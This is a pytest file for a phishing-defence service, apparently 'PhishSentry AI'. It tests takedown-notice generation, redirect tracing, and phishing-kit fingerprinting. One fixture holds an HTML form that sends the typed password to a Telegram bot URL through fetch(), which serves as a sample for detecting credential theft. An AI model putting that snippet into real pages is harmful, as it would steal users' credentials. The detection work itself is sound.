"""
tests/test_takedown_and_redirects.py
====================================
Unit and integration tests for Abuse Takedown Generator, Multi-Hop Redirect Tracer,
and Phishing Kit / Telegram Drop Fingerprinter.
"""

import pytest
from fastapi.testclient import TestClient
from app.main import app
from app.takedown_generator import generate_abuse_takedown_package, resolve_mock_abuse_contacts
from app.redirect_tracer import trace_redirect_hops
from app.kit_fingerprinter import fingerprint_phishing_kit

client = TestClient(app)

def test_takedown_notice_generation():
    scan_data = {
        "url": "http://paypal-security-update.xyz/login",
        "matched_brand": "paypal",
        "s_phish": 0.96,
        "phishpedia_consistency": {
            "brand_display_name": "PayPal",
            "brand_confidence": 0.94,
            "canonical_domains": ["paypal.com", "paypal-community.com"],
            "visual_explanation": "Direct visual and structural impersonation of PayPal."
        },
        "tls_telemetry": {
            "issuer": "Let's Encrypt",
            "resolved_ip": "198.51.100.42"
        }
    }
    
    pkg = generate_abuse_takedown_package(scan_data)
    assert pkg.target_domain == "paypal-security-update.xyz"
    assert "abuse@namecheap.com" in pkg.registrar_abuse_email
    assert "URGENT ABUSE TAKEDOWN" in pkg.subject_line
    assert "198.51.100.42" in pkg.body_text
    assert "PhishSentry AI" in pkg.body_text
    assert "paypal.com" in pkg.body_text

def test_redirect_tracer_direct():
    res = trace_redirect_hops("https://www.paypal.com/signin")
    assert res.total_hops == 1
    assert res.is_multi_hop is False
    assert res.is_shortened is False
    assert res.evasion_risk_boost == 0.0

def test_redirect_tracer_shortener():
    res = trace_redirect_hops("http://bit.ly/secure-login-portal")
    assert res.is_shortened is True
    assert res.total_hops >= 2
    assert res.is_multi_hop is True
    assert res.evasion_risk_boost > 0.0

def test_redirect_tracer_open_redirect():
    res = trace_redirect_hops("https://google.com/url?q=http://phish-target.xyz/login")
    assert res.total_hops >= 2
    assert res.is_multi_hop is True
    assert res.final_url == "http://phish-target.xyz/login"

def test_kit_fingerprinter_evilproxy():
    html = """
    <html>
        <head><title>Sign in</title></head>
        <body>
            <script src="/proxy/auth/v1/reverse_proxy_token.js"></script>
        </body>
    </html>
    """
    sig = fingerprint_phishing_kit(html, ["/proxy/auth/v1/reverse_proxy_token.js"])
    assert sig.is_kit_detected is True
    assert sig.kit_name == "EvilProxy"
    assert sig.kit_family == "Reverse-Proxy AiTM"
    assert sig.confidence >= 0.90

def test_kit_fingerprinter_telegram_drop():
    html = """
    <form onsubmit="fetch('https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage?chat_id=987654&text='+pwd)">
    </form>
    """
    sig = fingerprint_phishing_kit(html, [])
    assert sig.is_kit_detected is True
    assert sig.is_telegram_exfiltration is True
    assert sig.mitre_attack_id == "T1020"

def test_takedown_endpoint_api():
    payload = {
        "format": "takedown",
        "scan_result": {
            "url": "http://bank-login-verify.xyz/auth",
            "s_lex": 0.9,
            "s_phish": 0.95,
            "shap_contributions": {"s_lex": 0.9},
            "confidence": "full",
            "latency_ms": 45.0,
            "matched_brand": "paypal",
            "tls_telemetry": {
                "has_tls": True,
                "issuer": "Let's Encrypt",
                "resolved_ip": "203.0.113.19"
            }
        }
    }
    response = client.post("/takedown/generate", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["target_domain"] == "bank-login-verify.xyz"
    assert "URGENT ABUSE TAKEDOWN" in data["subject_line"]
    assert "203.0.113.19" in data["body_text"]
